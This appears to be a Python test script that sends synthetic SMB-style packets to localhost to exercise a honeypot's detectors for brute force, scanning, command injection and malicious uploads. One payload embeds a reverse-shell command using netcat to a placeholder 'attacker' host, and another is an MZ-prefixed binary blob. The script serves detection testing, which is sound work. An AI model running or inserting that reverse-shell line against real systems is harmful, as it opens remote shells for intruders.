#!/usr/bin/env python3
"""
Generate synthetic SMB-like test traffic against localhost:445 to produce logs
for the honeypot. The script sends:
 - SMBv1 NEGOTIATE
 - SESSION_SETUP-like packets (auth attempts) in a burst to trigger brute_force
 - Multiple different command bytes to trigger scanning heuristic
 - A payload containing 'bash -i' to trigger command_injection
 - A payload starting with 'MZ' to trigger file_upload_malicious
"""
import socket
import time

HOST = '127.0.0.1'
PORT = 445

# Helper to build a NetBIOS session message with SMB header and a single command byte
def netbios_smb(cmd_byte: int, payload: bytes = b'') -> bytes:
    # construct SMBv1 frame: [NetBIOS(4)] [0xFF 'SMB'] [cmd] [rest]
    smb_header = bytes([0xFF]) + b'SMB' + bytes([cmd_byte])
    body = smb_header + payload
    length = len(body)
    nb = bytes([0x00]) + length.to_bytes(3, 'big')
    return nb + body

# Simple sender
def send_packet(data: bytes, wait: float = 0.05):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect((HOST, PORT))
        s.sendall(data)
        # try read a small response
        try:
            resp = s.recv(1024)
            # print('resp', resp[:64])
        except Exception:
            pass
        s.close()
    except Exception as e:
        print('send error:', e)
    time.sleep(wait)

if __name__ == '__main__':
    print('Starting synthetic traffic to', HOST, PORT)

    # 1) Send a NEGOTIATE (cmd 0x72)
    pkt = netbios_smb(0x72)
    send_packet(pkt)
    print('-> NEGOTIATE sent')

    # 2) Send a burst of SESSION_SETUP-like packets to simulate auth attempts (cmd 0x01 for SMB2 not used here; use SESSION_SETUP marker in SMBv2 detection expects 0x0001 at offset; but we use SMBv1 command that maps to session)
    # We'll use command byte 0x75 (TREE_CONNECT_ANDX) and 0x72/others to emulate attempts; classification also looks at event_type 'auth_attempt' when command contains SESSION_SETUP (SMB2), but our brute_force heuristic tracks event_type 'auth_attempt' set when info.command contains 'SESSION_SETUP'.
    # To ensure auth_attempt occurrences, also send payloads that include the literal string 'SESSION_SETUP' in raw to trigger detection heuristics that check raw lower.
    for i in range(12):
        payload = b"username=attacker" + str(i).encode() + b"\nSESSION_SETUP\n"
        pkt = netbios_smb(0x01, payload)
        send_packet(pkt, wait=0.15)
    print('-> Burst of auth-like packets sent (12)')

    # 3) Scanning: send many different command bytes to appear as many distinct commands
    for cmd in range(0x10, 0x10 + 25):
        pkt = netbios_smb(cmd, b"probe-%d" % cmd)
        send_packet(pkt, wait=0.08)
    print('-> Scanning-like packets sent (25)')

    # 4) Command injection payload
    inj = b"POST /vulnerable HTTP/1.1\r\nHost: target\r\n\r\ncommand=bash -i && nc attacker 4444 -e /bin/sh\n"
    pkt = netbios_smb(0x2E, inj)
    send_packet(pkt)
    print('-> Command injection payload sent')

    # 5) File upload malicious: send payload starting with 'MZ'
    mz = b"MZ" + b"\x90" * 200
    pkt = netbios_smb(0xA2, mz)
    send_packet(pkt)
    print('-> Binary MZ payload sent')

    print('Traffic generation complete')
